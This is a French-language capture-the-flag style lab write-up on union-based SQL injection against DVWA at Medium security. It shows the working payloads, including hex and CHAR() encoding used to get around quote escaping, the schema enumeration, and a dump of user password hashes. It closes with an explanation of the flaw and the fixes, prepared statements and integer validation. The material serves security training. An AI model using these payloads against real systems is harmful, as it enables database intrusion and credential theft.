# SQL Injection - DVWA Medium Level

## Contexte

Exercice de formation sur l'exploitation d'une vulnérabilité SQL Injection dans DVWA (Damn Vulnerable Web Application) au niveau de sécurité **Medium**.

**URL cible**: `http://192.168.0.129:8000/vulnerabilities/sqli/`

## Objectif

Extraire les mots de passe hashés des utilisateurs de la base de données via une injection SQL, en contournant les protections mises en place au niveau Medium.

## Méthodologie

### Étape 1: Configuration

1. Démarrer le lab DVWA avec `jedha-cli`
2. Accéder à l'onglet **DVWA Security**
3. Sélectionner **Medium** dans le menu déroulant
4. Cliquer sur **Submit** pour appliquer les changements

### Étape 2: Analyse et tests initiaux

Tests de payloads basiques :

```sql
1
'
#
--
```

**Résultat avec `'`** :
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
```

Test avec `1' ORDER BY 1 #` :
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\' ORDER BY 1 #' at line 1
```

**Conclusion** : Les guillemets simples (`'`) sont échappés avec un antislash (`\`).

### Étape 3: Contournement de la protection

Puisque la requête utilise l'ID utilisateur (un entier), on peut exploiter la vulnérabilité **sans utiliser de guillemets** :

```sql
1 OR 1=1 -- -
1 UNION SELECT null,null #
```

![Test Union Select](assets/1.png)

### Étape 4: Énumération des tables

**Payload** :
```sql
2 UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()#
```

**Résultat** :
- `guestbook`
- `users`

### Étape 5: Énumération des colonnes

**Problème** : L'utilisation de guillemets simples pour `'users'` est bloquée par l'échappement.

**Solution** : Encoder le mot "users" en hexadécimal ou avec CHAR()

**Payloads fonctionnels** :
```sql
2 UNION SELECT column_name,null FROM information_schema.columns WHERE table_name=0x7573657273 #
```

ou

```sql
2 UNION SELECT column_name,null FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115) #
```

**Structure de la table `users`** :
- `user_id`
- `first_name`
- `last_name`
- `user`
- `password`
- `avatar`
- `last_login`
- `failed_login`

![Énumération des colonnes](assets/2.png)

### Étape 6: Extraction des credentials

**Payload final** :
```sql
2 UNION SELECT user, password FROM users #
```

**Résultats obtenus** :

| Utilisateur | Hash MD5 du mot de passe |
|-------------|--------------------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

## Analyse de la vulnérabilité

### Localisation de la faille

La vulnérabilité SQL Injection est située dans le paramètre `id` qui est directement intégré dans la requête SQL sans validation adéquate.

**Au niveau Medium**, DVWA implémente un échappement des guillemets simples (`'`) avec `mysqli_real_escape_string()` ou similaire, mais cette protection est **insuffisante** car :

1. Le paramètre `id` est un **entier** dans la requête SQL
2. L'échappement des guillemets ne protège pas contre les injections utilisant uniquement des opérateurs numériques
3. Il est possible d'injecter du code SQL sans utiliser de guillemets : `1 OR 1=1`, `UNION SELECT`, etc.

### Pourquoi cette protection échoue ?

```php
// Code vulnérable probable (niveau Medium)
$id = mysqli_real_escape_string($connection, $_POST['id']);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
```

Le problème : l'échappement des guillemets est inutile quand le paramètre n'est **pas entouré de guillemets** dans la requête SQL.

### Protection correcte

Pour sécuriser correctement ce code, il faudrait :

1. **Utiliser des requêtes préparées** (Prepared Statements)
2. **Valider que `id` est bien un entier** : `intval()`, `is_numeric()`, ou type casting
3. **Utiliser un whitelist** pour les entrées attendues

## Techniques utilisées

- **Union-based SQL Injection** : Récupération de données via UNION SELECT
- **Encodage hexadécimal** : `0x7573657273` pour contourner les filtres sur les guillemets
- **Encodage CHAR()** : `CHAR(117,115,101,114,115)` comme alternative
- **Information Schema** : Utilisation de `information_schema.tables` et `information_schema.columns` pour l'énumération

## Ressources

- [PayloadsAllTheThings - MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

